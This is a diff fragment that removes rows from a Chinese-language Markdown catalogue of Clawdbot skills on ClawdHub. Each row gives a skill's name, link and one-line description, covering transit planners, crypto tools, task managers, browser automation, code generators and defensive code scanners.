-| Marktplaats 分类广告 | [Clawdbot/marktplaats](https://clawdhub.com/skills/marktplaats) | 通过过滤支持在所有类别中搜索 Marktplaats.nl 分类。 |
-| mcporter | [Clawdbot/mcporter-skill](https://clawdhub.com/skills/mcporter-skill) | （无） |
-| 男性心理健康支持 | [Clawdbot/mens-mental-health](https://clawdhub.com/skills/mens-mental-health) | 通过情绪检查、压力工具和无评判空间为男性提供心理健康支持 |
-| MPC Accept Crypto Payments | [Clawdbot/mpc-accept-crypto-payments](https://clawdhub.com/skills/mpc-accept-crypto-payments) | 通过 MoonPay Commerce（以前称为 Helio）在 Solana 上接受加密货币付款。创建支付链接、生成结账 URL、检查交易并列出支持的货币。当用户想要接受加密支付、创建支付链接、使用加密对产品/服务收费或查询支付交易时使用。需要具有 API 密钥和密码的 MoonPay Commerce 帐户。 |
-| 域名反向查询 | [Clawdbot/nameserver-reverse](https://clawdhub.com/skills/nameserver-reverse) | （无） |
-| Nano Banana Pro 图像生成 | [Clawdbot/nano-banana-pro](https://clawdhub.com/skills/nano-banana-pro) | 使用 Nano Banana Pro (Gemini 3 Pro Image) 生成/编辑图像。用于图像创建/修改请求，包括。编辑。支持文字转图像+图像转图像； 1K/2K/4K；使用--输入图像。 |
-| Nginx 生成器 | [Clawdbot/nginx-gen](https://clawdhub.com/skills/nginx-gen) | 从简单的英语生成 nginx 配置。当您需要反向代理、SSL 或负载平衡设置时使用。 |
-| No-Nonsense Tasks | [Clawdbot/no-nonsense-tasks](https://clawdhub.com/skills/no-nonsense-tasks) | 使用 SQLite 的严肃任务管理器。跟踪任务的状态（待办事项、待办事项、进行中、已完成）、描述和标签。在管理个人任务、待办事项、项目跟踪或任何需要基于状态的任务组织的工作流程时使用。支持添加、列出、过滤、更新、移动和删除任务。 |
-| Nginx Proxy Manager | [Clawdbot/npm-proxy](https://clawdhub.com/skills/npm-proxy) | 管理 Nginx 代理管理器 (NPM) 主机、证书和访问列表。当用户想要添加新域、将域指向服务器/端口、启用 SSL 或检查代理主机的状态时使用。 |
-| 奥地利铁路查询 | [Clawdbot/oebb-scotty](https://clawdhub.com/skills/oebb-scotty) | 奥地利铁路旅行规划师（ÖBB Scotty）。在规划奥地利的火车旅程、检查车站的出发/到达或寻找服务中断时使用。涵盖 ÖBB 列车、S-Bahn、区域列车以及与邻国的连接。 |
-| Onchain CLI | [Clawdbot/onchain](https://clawdhub.com/skills/onchain) | 用于加密货币投资组合跟踪、市场数据、CEX 历史记录和交易查找的 CLI。当用户询问加密货币价格、钱包余额、投资组合价值、Coinbase/Binance 持有量、Polymarket 预测或交易详细信息时使用。 |
-| Onchain 测试 | [Clawdbot/onchain-test](https://clawdhub.com/skills/onchain-test) | 用于加密货币投资组合跟踪、市场数据和 CEX 历史记录的 CLI。当用户询问加密货币价格、钱包余额、投资组合价值、Coinbase/Binance 持有量或 Polymarket 预测时使用。 |
-| OpenOcean DEX 聚合器 | [Clawdbot/openocean](https://clawdhub.com/skills/openocean) | OpenOcean DEX 聚合器。跨 25 个以上区块链的最佳交换率，具有跨链支持。 |
-| ORF 新闻摘要 | [Clawdbot/orf](https://clawdhub.com/skills/orf) | 点播 ORF 德语新闻摘要。当用户说“orf”、“pull orf”或“orf 10”时使用。关注奥地利政治（内陆）和国际政治（澳大利亚）+各大头条；排除体育运动。将每个项目作为自己的消息发送（标题+年龄+链接）。然后在卡通 ZiB 工作室中生成纳米香蕉图像，由主播播报新闻，以及基于所选故事的微妙复活节彩蛋。 |
-| Oura Analytics | [Clawdbot/oura-analytics](https://clawdhub.com/skills/oura-analytics) | Oura Ring 数据集成和分析。从 Oura Cloud API 获取睡眠分数、准备情况、活动、HRV 和趋势。生成自动报告、与生产力的相关性以及针对低恢复日的基于触发器的警报。需要 OURA_API_TOKEN（在 cloud.ouraring.com 获取）。 |
-| Perplexity | [Clawdbot/perplexity](https://clawdhub.com/skills/perplexity) | 通过 Perplexity API 在网络上搜索人工智能驱动的答案。返回带有引用的接地响应。支持批量查询。 |
-| Perplexity Deep Search | [Clawdbot/perplexity-deep-search](https://clawdhub.com/skills/perplexity-deep-search) | 通过 Perplexity API 进行深度搜索。三种模式：搜索（快速事实）、推理（复杂分析）、研究（深入报告）。返回带有引文的基于 AI 的答案。 |
-| Polymarket 代理 | [Clawdbot/polymarket-agent](https://clawdhub.com/skills/polymarket-agent) | 自主预测市场代理 - 分析市场、研究新闻并识别交易机会 |
-| 便携式工具 | [Clawdbot/portable-tools](https://clawdhub.com/skills/portable-tools) | 构建跨设备工具，无需硬编码路径或帐户名 |
-| Premium Domain 搜索 | [Clawdbot/premium-domains](https://clawdhub.com/skills/premium-domains) | 搜索 Afternic、Sedo、Atom、Dynadot、Namecheap、NameSilo 和 Unstoppable Domains 中待售的优质域名。 |
-| Prism 代币扫描器 | [Clawdbot/prism-scanner](https://clawdhub.com/skills/prism-scanner) | 使用 Strykr PRISM API 的令牌安全扫描器。分析任何代币的拉动风险、模仿诈骗、持有者集中度和流动性状况。 |
-| Private Connect | [Clawdbot/private-connect](https://clawdhub.com/skills/private-connect) | 从任何地方按名称访问私人服务。没有 VPN 或 SSH 隧道。 |
-| Pump Fun | [Clawdbot/pump-fun](https://clawdhub.com/skills/pump-fun) | 使用 PumpPortal API 在 Pump.fun 上购买、出售和启动代币 |
-| Quit Smoking | [Clawdbot/quit-smoking](https://clawdhub.com/skills/quit-smoking) | 通过无烟追踪、渴望支持和健康恢复时间表戒烟 |
-| 戒大麻追踪 | [Clawdbot/quit-weed](https://clawdhub.com/skills/quit-weed) | 通过连续追踪和渴望支持来打破耐受性或戒掉大麻 |
-| Radarr 电影管理 | [Clawdbot/radarr](https://clawdhub.com/skills/radarr) | 搜索电影并将其添加到 Radarr。支持集合、添加搜索选项。 |
-| Raindrop.io 书签 | [Clawdbot/raindrop](https://clawdhub.com/skills/raindrop) | 通过 CLI 搜索、列出和管理 Raindrop.io 书签。当用户想要查找已保存的链接、浏览集合、添加新书签、使用标签进行组织、在集合之间移动书签或使用 Raindrop 库时使用。支持读取（搜索、列表、获取、标签）和写入（添加、删除、移动、更新、批量操作）。 |
-| Readeck | [Clawdbot/readeck](https://clawdhub.com/skills/readeck) | Readeck 集成用于保存和管理文章。支持通过 Readeck 的 API 添加 URL、列出条目和管理书签。根据请求或通过环境变量 READECK_URL 和 READECK_API_KEY 配置自定义 URL 和 API 密钥。 |
-| Refund Radar | [Clawdbot/refund-radar](https://clawdhub.com/skills/refund-radar) | 扫描银行对账单以检测经常性费用、标记可疑交易并使用交互式 HTML 报告起草退款请求。 |
-| Relay To Agent | [Clawdbot/relay-to-agent](https://clawdhub.com/skills/relay-to-agent) | 将消息中继到任何 OpenAI 兼容 API 上的 AI 代理。通过会话管理支持多轮对话。列出代理、发送消息、重置会话。 |
-| 密钥扫描器 | [Clawdbot/secret-scanner](https://clawdhub.com/skills/secret-scanner) | 扫描您的代码库以查找泄露的机密和 API 密钥。当您在推送前需要进行安全检查时使用。 |
-| 安全审计 | [Clawdbot/security-audit](https://clawdhub.com/skills/security-audit) | 针对 Clawdbot 部署的全面安全审核。扫描暴露的凭据、开放端口、弱配置和漏洞。包括自动修复模式。 |
-| Skånetrafiken 交通查询 | [Clawdbot/skanetrafiken](https://clawdhub.com/skills/skanetrafiken) | 斯科讷省公共交通旅行规划器 (Skånetrafiken)。计划实时延误的巴士/火车行程。支持前往哥本哈根的车站、地址、地标和跨境旅行。 |
-| Snow Report | [Clawdbot/snow-report](https://clawdhub.com/skills/snow-report) | 获取全球任何山区度假胜地的雪况、预报和滑雪报告。当询问雪、粉雪、滑雪条件或山区天气时使用。通过 OpenSnow 支持 1000 多个度假村。用户可以设置喜爱的山峰以便快速访问。支持 SnowTick 4 字母代码（JHMR、TARG、MMTH）以进行快速查找。 |
-| Solana Trader | [Clawdbot/solana-trader](https://clawdhub.com/skills/solana-trader) | 通过 Jupiter 聚合器进行 Solana 钱包管理和代币交易。检查余额、查看交易历史记录、交换代币并管理您的 Solana 投资组合。 |
-| Solana Trader | [Clawdbot/solana-trader-v2](https://clawdhub.com/skills/solana-trader-v2) | 通过 Jupiter 聚合器进行 Solana 钱包管理和代币交易。检查余额、查看交易历史记录、交换代币并管理您的 Solana 投资组合。 |
-| Sports Ticker | [Clawdbot/sports-ticker](https://clawdhub.com/skills/sports-ticker) | 足球、NFL、NBA、NHL、MLB、F1 等直播体育赛事提醒。使用免费的 ESPN API 进行实时得分。追踪全球任何主要联赛的任何球队。 |
-| SQL 注入扫描器 | [Clawdbot/sql-injection-scanner](https://clawdhub.com/skills/sql-injection-scanner) | 检测代码库中的 SQL 注入漏洞。当您需要在不安全的数据库查询被利用之前找到它们时使用。 |
-| Strykr Prism | [Clawdbot/strykr-prism](https://clawdhub.com/skills/strykr-prism) | 适用于 AI 代理的实时金融数据 API。股票、加密货币、外汇、ETF 集中在一个统一的源中。为交易机器人、市场仪表板和金融科技应用程序提供支持。 Alpha Vantage、Polygon.io、CoinGecko 的替代品。 120 多个端点。 |
-| taskleef | [Clawdbot/taskleef](https://clawdhub.com/skills/taskleef) | 通过 Taskleef.com 管理待办事项、任务、项目或看板时使用。支持添加、列出、完成、删除待办事项、组织项目以及管理看板。当用户想要跟踪任务、管理待办事项列表、按项目组织工作或使用看板工作流程时使用。 |
-| Telegram Offline Voice | [Clawdbot/telegram-offline-voice](https://clawdhub.com/skills/telegram-offline-voice) | Telegram 的优雅 TTS 语音消息（支持 Edge-TTS 和 Sherpa-ONNX）。 |
-| Tesla 控制 | [Clawdbot/tesla](https://clawdhub.com/skills/tesla) | 控制您的 Tesla 车辆 - 锁定/解锁、气候、位置、充电状态等。支持多种车辆。 |
-| Tesla Fleet API | [Clawdbot/tesla-fleet-api](https://clawdhub.com/skills/tesla-fleet-api) | 与 Tesla 官方车队 API 集成时使用，以读取车辆/能源设备数据或发出远程命令（例如启动 HVAC 预处理、唤醒车辆、充电控制）。涵盖入职（开发人员应用程序注册、区域/基本 URL）、OAuth 令牌流（第三方 + 合作伙伴令牌、刷新轮换）、所需的域/公钥托管，以及使用特斯拉的官方车辆命令/tesla-http-proxy 进行签名车辆命令。 |
-| Test | [Clawdbot/test](https://clawdhub.com/skills/test) | 用于加密货币投资组合跟踪、市场数据和 CEX 历史记录的 CLI。当用户询问加密货币价格、钱包余额、投资组合价值、Coinbase/Binance 持有量或 Polymarket 预测时使用。 |
-| Todoist Task Manager | [Clawdbot/todoist-task-manager](https://clawdhub.com/skills/todoist-task-manager) | 通过“todoist”CLI 管理 Todoist 任务（列出、添加、修改、完成、删除）。支持过滤器、项目、标签和优先级。 |
-| Transport For London | [Clawdbot/transport-for-london-journey-disruption](https://clawdhub.com/skills/transport-for-london-journey-disruption) | 从开始/结束/时间规划 TfL 旅程，解析位置（首选邮政编码），并警告中断情况；在受到干扰时提出替代方案。 |
-| Trimet | [Clawdbot/trimet](https://clawdhub.com/skills/trimet) | 获取波特兰交通信息，包括抵达信息、行程计划和提醒。当用户询问波特兰的巴士、MAX、火车或交通时使用。 |
-| UK Trains | [Clawdbot/uk-trains](https://clawdhub.com/skills/uk-trains) | 查询英国国家铁路实时出发板、到达、延误和火车服务。当被问及英国铁路的火车时间、出发、到达、延误、站台或“下一趟火车是什么时候”时使用。通过 Darwin/Huxley2 API 支持所有 GB 站。 |
-| Wallet | [Clawdbot/wallet](https://clawdhub.com/skills/wallet) | 加密货币和法定货币的数字钱包管理。用于管理多种钱包类型的统一界面。 |
-| Weather Pollen | [Clawdbot/weather-pollen](https://clawdhub.com/skills/weather-pollen) | 使用免费 API 报告任何位置的天气和花粉。获取当前状况、预测和花粉数据。 |
-| Wheels Router | [Clawdbot/wheels-router](https://clawdhub.com/skills/wheels-router) | 使用 Wheels Router（香港）和 Transitous（全球）规划全球公共交通行程 |
-| xAI / Grok | [Clawdbot/xai](https://clawdhub.com/skills/xai) | 通过 xAI API 与 Grok 模型聊天。支持 Grok-3、Grok-3-mini、vision 等。 |
-| XSS 扫描器 | [Clawdbot/xss-scanner](https://clawdhub.com/skills/xss-scanner) | 检测前端代码中的 XSS 漏洞。当您需要在发布之前发现跨站点脚本风险时使用。 |
+## 3、⚡ 效率提升
 
-### ⚙️ 自动化工具
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| GitHub Actions 生成器 | [Clawdbot/action-gen](https://clawdhub.com/skills/action-gen) | 从简单的英语生成 GitHub Actions 工作流程。设置 CI 时使用。 |
-| Affiliatematic 联属营销 | [Clawdbot/affiliatematic](https://clawdhub.com/skills/affiliatematic) | 使用affiliatematic.com 将人工智能支持的亚马逊联属产品推荐集成到网站中。 当您需要执行以下操作时使用：(1) 将亚马逊联属营销小部件添加到网站，(2) 根据页面内容设置自动产品推荐，(3) 通过人工智能支持的产品匹配优化联属营销收入，(4) 配置联属营销自动化。 触发因素：亚马逊联属网络营销、联属网络营销、产品推荐、联属网络小部件、亚马逊联营公司集成、与亚马逊合作的网站货币化。 |
-| Agent Browser | [Clawdbot/agent-browser](https://clawdhub.com/skills/agent-browser) | 一个基于 Rust 的快速无头浏览器自动化 CLI，具有 Node.js 后备功能，使 AI 代理能够通过结构化命令导航、单击、键入和快照页面。 |
-| Agent Browser | [Clawdbot/agent-browser-2](https://clawdhub.com/skills/agent-browser-2) | 自动执行浏览器交互以进行 Web 测试、表单填写、屏幕截图和数据提取。当用户需要导航网站、与网页交互、填写表单、截取屏幕截图、测试 Web 应用程序或从网页中提取信息时使用。 |
-| Agent Browser | [Clawdbot/agent-browser-clawdbot](https://clawdhub.com/skills/agent-browser-clawdbot) | 无头浏览器自动化 CLI 针对 AI 代理进行了优化，具有可访问性树快照和基于引用的元素选择 |
-| Agent Browser | [Clawdbot/agent-browser-clawdbot-bak-2026-01-28t18-01-09-10-30](https://clawdhub.com/skills/agent-browser-clawdbot-bak-2026-01-28t18-01-09-10-30) | 无头浏览器自动化 CLI 针对 AI 代理进行了优化，具有可访问性树快照和基于引用的元素选择 |
-| Shell 别名生成器 | [Clawdbot/alias-gen](https://clawdhub.com/skills/alias-gen) | 从命令历史记录生成 shell 别名。在简化终端工作流程时使用。 |
-| ASC 发布流程 | [Clawdbot/asc-release-flow](https://clawdhub.com/skills/asc-release-flow) | 使用 asc 发布、构建、版本和提交命令的 TestFlight 和 App Store 的端到端发布工作流程。当要求上传构建、分发到 TestFlight 或提交到 App Store 时使用。 |
-| Basecamp CLI | [Clawdbot/basecamp-cli](https://clawdhub.com/skills/basecamp-cli) | 通过 TypeScript CLI 管理 Basecamp（通过 bc3 API / 37signals Launchpad）项目、待办事项、消息和篝火。当您想要从终端列出/创建/更新 Basecamp 项目和待办事项时，或者将 Basecamp 自动化集成到 Clawdbot 工作流程时，请使用。 |
-| Git 分支命名器 | [Clawdbot/branch-name-gen](https://clawdhub.com/skills/branch-name-gen) | 从简单的英语生成描述性的 git 分支名称。当您需要遵循约定的分支名称时使用。 |
-| Git 分支命名器 | [Clawdbot/branch-namer](https://clawdhub.com/skills/branch-namer) | 从简单的英语生成描述性的 git 分支名称。当您需要遵循约定的分支名称时使用。 |
-| Browserbase 浏览器自动化 | [Clawdbot/browse](https://clawdhub.com/skills/browse) | 使用 stagehand CLI 创建和部署浏览器自动化功能的完整指南 |
-| Browser.cash 代理 | [Clawdbot/browser-cash](https://clawdhub.com/skills/browser-cash) | 通过 Browser.cash 启动畅通无阻的浏览器会话，实现网络自动化。会话绕过反机器人保护（Cloudflare、DataDome 等），使其成为抓取和自动化的理想选择。 |
-| Browsh 文本浏览器 | [Clawdbot/browsh](https://clawdhub.com/skills/browsh) | 现代基于文本的浏览器。使用无头 Firefox 在终端中呈现网页。 |
-| CI 配置生成器 | [Clawdbot/ci-config-gen](https://clawdhub.com/skills/ci-config-gen) | 从您的项目生成 GitHub Actions 工作流程。从头开始设置 CI/CD 时使用。 |
-| Claude 连接管理 | [Clawdbot/claude-connect](https://clawdhub.com/skills/claude-connect) | 立即将 Claude 连接到 Clawdbot，并保持 24/7 的连接。设置后运行以链接您的订阅，然后永久自动刷新令牌。 |
-| Clawd Modifier | [Clawdbot/clawd-modifier](https://clawdhub.com/skills/clawd-modifier) | 修改 Clawd，克劳德代码吉祥物。当用户想要在 Claude Code CLI 中自定义 Clawd 的外观时，请使用此技能，包括更改颜色（蓝色 Clawd、绿色 Clawd、节日主题）、添加功能（手臂、帽子、配件）或创建自定义 ASCII 艺术变体。触发器包括“更改 Clawd 颜色”、“赋予 Clawd 手臂”、“自定义吉祥物”、“修改 Clawd”、“使 Clawd [颜色]”或任何个性化 Claude 代码终端吉祥物的请求。 |
-| Comfy CLI | [Clawdbot/comfy-cli](https://clawdhub.com/skills/comfy-cli) | 安装、管理和运行 ComfyUI 实例。在设置 ComfyUI、启动服务器、安装/更新/调试自定义节点、从 CivitAI/HuggingFace 下载模型、管理工作区、运行 API 工作流程或排除与 bisect 的节点冲突时使用。 |
-| ComfyUI 工作流请求 | [Clawdbot/comfyui-request](https://clawdhub.com/skills/comfyui-request) | 向 ComfyUI 发送工作流请求并返回图像结果。 |
-| React 组件生成器 | [Clawdbot/component-gen](https://clawdhub.com/skills/component-gen) | 从简单的英语描述生成 React 组件。当您需要快速 UI 组件时使用。 |
-| Cursor CLI Agent | [Clawdbot/cursor-agent](https://clawdhub.com/skills/cursor-agent) | 使用 Cursor CLI 代理执行各种软件工程任务的综合技能（更新了 2026 年功能，包括 tmux 自动化指南）。 |
-| Fizzy CLI | [Clawdbot/emredoganer-fizzy-cli](https://clawdhub.com/skills/emredoganer-fizzy-cli) | 使用个人访问令牌通过 TypeScript CLI 管理 Fizzy 看板、卡片、注释、标签和步骤。当您想要从终端创建或管理 Fizzy 卡，或将 Fizzy 自动化集成到 Clawdbot 工作流程中时使用。 |
-| Fizzy 看板管理 | [Clawdbot/fizzy-cli](https://clawdhub.com/skills/fizzy-cli) | 使用 fizzy-cli 工具从命令行验证和管理 Fizzy 看板、卡片、评论、标签、列、用户和通知。当您需要列出、创建、更新或删除 Fizzy 资源或编写 Fizzy 工作流程脚本时，请应用此技能。 |
-| GitHub Actions 生成器 | [Clawdbot/github-action-gen](https://clawdhub.com/skills/github-action-gen) | 从简单的英语生成 GitHub Actions 工作流程。设置 CI 时使用。 |
-| Google Gemini Media | [Clawdbot/google-gemini-media](https://clawdhub.com/skills/google-gemini-media) | 使用 Gemini API（Nano Banana 图像生成、Veo 视频、Gemini TTS 语音和音频理解）提供端到端多模式媒体工作流程和代码模板，以实现“生成 + 理解”。 |
-| GoPlaces | [Clawdbot/goplaces](https://clawdhub.com/skills/goplaces) | 通过 goplaces CLI 查询 Google Places API（新），以进行文本搜索、地点详细信息、解析和评论。用于脚本的人性化位置查找或 JSON 输出。 |
-| HokiPoki AI 模型切换 | [Clawdbot/hokipoki](https://clawdhub.com/skills/hokipoki) | 使用 HokiPoki CLI 无需切换选项卡即可切换 AI 模型。当有人陷入困境时，可以在 Claude、Codex 和 Gemini 之间切换。当用户想要向不同的 AI 模型请求帮助、跳到另一个 AI、从另一个模型获得第二意见、切换模型、与队友共享 AI 订阅或管理 HokiPoki 提供者/监听器模式时使用。触发条件：“为此使用 codex/gemini”、“跳到另一个模型”、“询问另一个 AI”、“获得第二意见”、“切换模型”、“hokipoki”、“监听请求”。 |
-| Home Assistant | [Clawdbot/homeassistant](https://clawdhub.com/skills/homeassistant) | 控制家庭助理 - 智能插头、灯光、场景、自动化。 |
-| 商业想法探索 | [Clawdbot/idea](https://clawdhub.com/skills/idea) | 启动克劳德后台会议来探索和分析商业想法。说“想法：[描述]”即可触发。 |
-| iOS 模拟器 | [Clawdbot/ios-simulator](https://clawdhub.com/skills/ios-simulator) | 21 个用于 iOS 应用测试、构建和自动化的生产就绪脚本。提供语义 UI 导航、构建自动化、可访问性测试和模拟器生命周期管理。针对具有最少令牌输出的 AI 代理进行了优化。 |
-| 爱尔兰外卖查找 | [Clawdbot/irish-takeaway](https://clawdhub.com/skills/irish-takeaway) | 查找爱尔兰附近的外卖店，并通过 Deliveroo/Just Eat 浏览菜单。使用 Google Places API 进行发现，并使用浏览器自动化进行菜单抓取。 |
-| Kubernetes 浏览器 | [Clawdbot/k8s-browser](https://clawdhub.com/skills/k8s-browser) | Kubernetes 仪表板和 Web UI 的浏览器自动化。在与 Kubernetes Dashboard、Grafana、ArgoCD UI 或其他 Web 界面交互时使用。需要 MCP_BROWSER_ENABLED=true。 |
-| Linear 问题跟踪 | [Clawdbot/linear](https://clawdhub.com/skills/linear) | 查询和管理线性问题、项目和团队工作流程。 |
-| LLM Council | [Clawdbot/llm-council](https://clawdhub.com/skills/llm-council) | 协调一个可配置的多成员 CLI 规划委员会（Codex、Claude Code、Gemini、OpenCode 或自定义）来制定独立的实施计划，对它们进行匿名化和随机化，然后进行判断并合并为一个最终计划。当您需要跨多个 CLI 代理的稳健、抗偏差规划工作流程、结构化 JSON 输出、重试和故障处理时使用。 |
-| macOS SPM 应用打包 | [Clawdbot/macos-spm-app-packaging](https://clawdhub.com/skills/macos-spm-app-packaging) | 无需 Xcode 项目即可搭建、构建和打包基于 SwiftPM 的 macOS 应用程序。当您需要从头开始的 macOS 应用程序布局、SwiftPM 目标/资源、自定义 .app 捆绑程序集脚本或 Xcode 外部的签名/公证/appcast 步骤时使用。 |
-| Apple Music MCP | [Clawdbot/mcp-applemusic](https://clawdhub.com/skills/mcp-applemusic) | 通过 AppleScript (macOS) 或 MusicKit API 集成 Apple Music |
-| Miniflux News | [Clawdbot/miniflux-news](https://clawdhub.com/skills/miniflux-news) | 使用 API 令牌通过 Miniflux 实例的 REST API 获取并分类最新的未读 RSS/新闻条目。当用户要求获取最新的 Miniflux 未读项目、列出带有标题/链接的最近条目或生成特定 Miniflux 条目的简短摘要时使用。包含一个捆绑脚本，用于使用 ~/.config/clawdbot/miniflux-news.json 中的凭据（或 MINIFLUX_URL 和 MINIFLUX_TOKEN 覆盖）查询 Miniflux（/v1/entries 和 /v1/entries/{id}）。 |
-| Mock 数据生成器 | [Clawdbot/mock-gen](https://clawdhub.com/skills/mock-gen) | 从描述、类型或模式生成真实的模拟数据。当您需要快速测试数据时使用。 |
-| Monarch Money | [Clawdbot/monarch-money](https://clawdhub.com/skills/monarch-money) | 用于 Monarch Money 预算管理的 TypeScript 库和 CLI。按日期/商家/金额搜索交易、更新类别、列出帐户和预算、管理身份验证。当用户询问 Monarch Money 交易、想要对支出进行分类、需要查找特定交易或想要自动执行预算任务时使用。 |
-| n8n 工作流 | [Clawdbot/n8n](https://clawdhub.com/skills/n8n) | 通过 API 管理 n8n 工作流程和自动化。在处理 n8n 工作流程、执行或自动化任务时使用 - 列出工作流程、激活/停用、检查执行状态、手动触发工作流程或调试自动化问题。 |
-| n8n 工作流 | [Clawdbot/n8n-1-0-2](https://clawdhub.com/skills/n8n-1-0-2) | 通过 API 管理 n8n 工作流程和自动化。在处理 n8n 工作流程、执行或自动化任务时使用 - 列出工作流程、激活/停用、检查执行状态、手动触发工作流程或调试自动化问题。 |
-| n8n 工作流自动化 | [Clawdbot/n8n-workflow-automation](https://clawdhub.com/skills/n8n-workflow-automation) | 设计和输出具有强大触发器、幂等性、错误处理、日志记录、重试和人工循环审核队列的 n8n 工作流 JSON。当您需要一个不会默默失败的可审核自动化时使用。 |
-| Newsletter 创建与策展 | [Clawdbot/newsletter-creation-curation](https://clawdhub.com/skills/newsletter-creation-curation) | 通过节奏建议和自动化工作流程创建行业特定的新闻通讯 |
-| NPM Script 生成器 | [Clawdbot/npm-script-gen](https://clawdhub.com/skills/npm-script-gen) | 使用 AI 生成 package.json 脚本。设置 npm 脚本时使用。 |
-| NPM 搜索 | [Clawdbot/npm-search](https://clawdhub.com/skills/npm-search) | 搜索 npm 包。用于查找 Node.js/JavaScript 包、库和工具。 |
-| PhantomBuster 自动化 | [Clawdbot/phantombuster](https://clawdhub.com/skills/phantombuster) | 通过 API 控制 PhantomBuster 自动化代理。列出代理、启动自动化、获取输出/结果、检查状态以及中止正在运行的代理。当用户需要运行 LinkedIn 抓取、Twitter 自动化、潜在客户生成幻象或任何 PhantomBuster 工作流程时使用。 |
-| Playwright CLI | [Clawdbot/playwright-cli](https://clawdhub.com/skills/playwright-cli) | 通过 Playwright CLI 实现浏览器自动化。打开页面、与元素交互、截取屏幕截图等等。非常适合编码代理和自动化测试工作流程。 |
-| PR + Commit Workflow | [Clawdbot/pr-commit-workflow](https://clawdhub.com/skills/pr-commit-workflow) | 在创建提交或拉取请求、强制执行人工编写的 PR 结构、意图捕获和代理工作流程中的证据时，应该使用此技能。 |
-| PR 编写器 | [Clawdbot/pr-writer](https://clawdhub.com/skills/pr-writer) | 从分支差异生成 PR 标题和描述。当您需要快速编写拉取请求描述时使用。 |
-| Pro | [Clawdbot/pro](https://clawdhub.com/skills/pro) | 创建有效技能的指南。当用户想要创建新技能（或更新现有技能）以通过专业知识、工作流程或工具集成扩展 Claude 的功能时，应使用此技能。 |
-| Publisher | [Clawdbot/publisher](https://clawdhub.com/skills/publisher) | 让你的技能易于理解且不容忽视 |
-| Ralph Loop | [Clawdbot/ralph-loop](https://clawdhub.com/skills/ralph-loop) | 为 Ralph Wiggum/AI 代理循环生成复制粘贴 bash 脚本（Codex、Claude Code、OpenCode、Goose）。当要求“Ralph 循环”、“Ralph Wiggum 循环”或 AI 循环时使用，通过 PROMPT.md + AGENTS.md、SPECS 和 IMPLMENTATION_PLAN.md 来规划/构建代码，包括规划与构建模式、背压、沙箱和完成条件。 |
-| Regex 生成器 | [Clawdbot/regex-gen](https://clawdhub.com/skills/regex-gen) | 从简单的英语描述生成正则表达式模式。当您需要正则表达式但讨厌编写它时使用。 |
-| Regex 编写器 | [Clawdbot/regex-writer](https://clawdhub.com/skills/regex-writer) | 从简单的英语描述生成正则表达式模式。当用户需要创建正则表达式而不记住语法时使用。 |
-| Research Idea | [Clawdbot/research-idea](https://clawdhub.com/skills/research-idea) | 启动后台 Clawdbot 会话来探索和分析业务想法。说“想法：[描述]”即可触发。 'idea'技能的分支重写为使用sessions_spawn而不是claude CLI + tmux + telegram CLI。结果发送到当前聊天，而不是保存的消息。零外部依赖。 |
-| Responsive Maker | [Clawdbot/responsive-maker](https://clawdhub.com/skills/responsive-maker) | 通过适当的断点使组件具有响应能力。当您的组件在移动设备上看起来很糟糕时使用。 |
-| Skill Creator | [Clawdbot/skill-creator](https://clawdhub.com/skills/skill-creator) | 创建有效技能的指南。当用户想要创建新技能（或更新现有技能）以通过专业知识、工作流程或工具集成扩展 Claude 的功能时，应使用此技能。 |
-| Snippet 生成器 | [Clawdbot/snippet-gen](https://clawdhub.com/skills/snippet-gen) | 从代码模式生成 VS Code 片段。创建编辑器快捷方式时使用。 |
-| SoloBuddy | [Clawdbot/solobuddy](https://clawdhub.com/skills/solobuddy) | 独立黑客的内置公共伴侣——内容工作流程、Twitter 参与、项目灵魂创建。生活助手，而不是工具。 |
-| Spotify AppleScript | [Clawdbot/spotify-applescript](https://clawdhub.com/skills/spotify-applescript) | 通过 AppleScript 控制 Spotify 桌面应用程序。播放播放列表、曲目、专辑、剧集并管理播放。无需 API 密钥或 OAuth，即可与 macOS Spotify 应用程序可靠地配合使用。 |
-| Stripe 支付平台 | [Clawdbot/stripe](https://clawdhub.com/skills/stripe) | Stripe 支付平台集成。通过 Stripe API 管理付款、订阅、发票和客户。 |
-| Swiggy | [Clawdbot/swiggy](https://clawdhub.com/skills/swiggy) | 通过 Swiggy 的 MCP 服务器订购食品、杂货并预订印度的餐厅。采用安全第一的确认工作流程进行食品配送、Instamart 杂货和就餐餐厅预订。 |
-| TCM Video Factory | [Clawdbot/tcm-video-factory](https://clawdhub.com/skills/tcm-video-factory) | 使用 Perplexity API 自动化健康视频制作规划（主题研究 - 脚本 - 角色 - 图像/视频提示）。基于TCM Video Factory工作流程。 |
-| Agent Browser | [Clawdbot/tekin](https://clawdhub.com/skills/tekin) | 一个基于 Rust 的快速无头浏览器自动化 CLI，具有 Node.js 后备功能，使 AI 代理能够通过结构化命令导航、单击、键入和快照页面。 |
-| TinyFish Web Agent | [Clawdbot/tinyfish-web-agent](https://clawdhub.com/skills/tinyfish-web-agent) | 使用 TinyFish/Mino Web 代理提取/抓取网站、提取数据并使用自然语言自动执行浏览器操作。当您需要从网站提取/抓取数据、处理受机器人保护的网站或自动化 Web 任务时使用。 |
-| Todoist 待办事项管理 | [Clawdbot/todoist-td](https://clawdhub.com/skills/todoist-td) | 使用 td (Todoist CLI) 从终端读取和管理 Todoist 待办事项/待办事项/任务。当用户询问其待办事项/任务/议程/清单（今天/即将到来/过期）、想要列出收件箱/任务/项目/标签、使用自然语言添加任务/待办事项或更新/完成/删除/移动任务（例如，向任务描述添加电话号码、更改截止日期、优先级、标签）时触发。 |
-| Towns Protocol | [Clawdbot/towns-protocol](https://clawdhub.com/skills/towns-protocol) | 在构建 Towns Protocol 机器人时使用 - 涵盖 SDK 初始化、斜杠命令、消息处理程序、反应、交互表单、区块链操作和部署。触发器：“towns bot”、“makeTownsBot”、“onSlashCommand”、“onMessage”、“sendInteractionRequest”、“webhook”、“bot 部署”、“@towns-protocol/bot” |
-| TSConfig 生成器 | [Clawdbot/tsconfig-gen](https://clawdhub.com/skills/tsconfig-gen) | 为您的项目类型生成最佳的 tsconfig.json。设置 TypeScript 时使用。 |
-| Type Generator | [Clawdbot/type-gen](https://clawdhub.com/skills/type-gen) | 从 JSON 生成 TypeScript 接口。在输入 API 响应时使用。 |
-| Validator Gen | [Clawdbot/validator-gen](https://clawdhub.com/skills/validator-gen) | 从 TypeScript 类型生成 Zod 和 Yup 验证模式。当您需要与您的类型匹配的运行时验证时使用。 |
